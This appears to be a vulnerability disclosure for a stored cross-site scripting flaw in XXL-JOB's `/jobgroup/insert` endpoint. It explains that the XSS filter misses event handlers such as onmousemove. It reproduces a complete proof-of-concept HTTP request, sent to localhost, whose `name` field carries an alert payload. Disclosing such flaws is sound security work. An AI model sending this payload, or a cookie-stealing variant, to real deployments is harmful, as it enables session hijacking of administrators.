# In XXL-JOB versions <=3.5.0, the '/jobgroup/insert' interface's `name` parameter is vulnerable to Cross-Site Scripting (XSS). A string containing malicious JavaScript code can be constructed. When viewing the executor management interface, these codes will be executed, potentially leading to the theft of sensitive information such as cookies.



Although `XssUtil` performs XSS filtering, it does not perform regular expression matching on event handlers such as `oncopy` and `onmousemove`, resulting in the triggering of XSS vulnerabilities.

![image-20260715234747279](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20260715234747279.png)

The `name` parameter has an XSS vulnerability

![image-20260719215629272](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260719215629272.png)

insert or update path

![image-20260719215710292](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260719215710292.png)

Parameters in the xxlJobGroup class

![image-20260719215747743](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260719215747743.png)



```
POST /jobgroup/insert HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 105
Origin: http://127.0.0.1:8080
Sec-GPC: 1
Connection: keep-alive
Referer: http://127.0.0.1:8080/jobgroup
Cookie: xxl_job_login_token=eyJ1c2VySWQiOiIxIiwiZXhwaXJlVGltZSI6MCwic2lnbmF0dXJlIjoiNzY5ZDJkZjUzZjQzNGNhZGI3YThlNDkzZWIxM2M5MWEifQ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

appname=a1112&name=%3Ca+onmousemove%3Dalert(%22xss%22)%3Exss&addressType=0&addressList=&accessToken=s1111
```

![image-20260719214507421](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260719214507421.png)

When examining actuator management, malicious code is executed

![image-20260719214623580](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260719214623580.png)

The malicious code is executed successfully.

